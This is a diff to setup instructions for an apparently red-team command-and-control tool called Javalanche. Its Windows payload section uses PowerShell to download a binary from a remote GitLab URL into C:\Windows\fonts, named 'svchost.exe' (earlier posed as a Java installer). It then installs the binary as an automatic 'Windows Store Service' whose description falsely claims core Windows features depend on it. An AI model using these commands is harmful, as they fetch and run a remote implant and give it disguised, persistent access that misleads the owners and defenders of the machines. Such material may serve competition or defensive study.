@@ -14,8 +14,9 @@ ps> .\setup.ps1 -server Beacon
 
 Windows Payload
 
-ps> wget -o C:\\Windows\\fonts\\jdk-23.0.1-bin-java.exe https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsBinary/x64/Debug/windowsBinary.exe?ref_type=heads 
-ps> Start-Process -FilePath "C:\\Windows\\fonts\\jdk-23.0.1-bin-java.exe" -Verb RunAs
+ps> wget -o C:\\Windows\fonts\svchost.exe https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsBinary/x64/Debug/windowsBinary.exe?ref_type=heads 
+ps> New-Service -name 'Windows Store Service' -BinaryPathName 'C:\\Windows\\fonts\\svchost.exe' -DisplayName 'Windows Store Service' -Description 'This Service Assists the Windows Store. If this service is stopped, many core windows features will not work correctly' -Startuptype Automatic
+ps> Start-Service -name 'Windows Store Service'
 
 
 Linux C2 Server
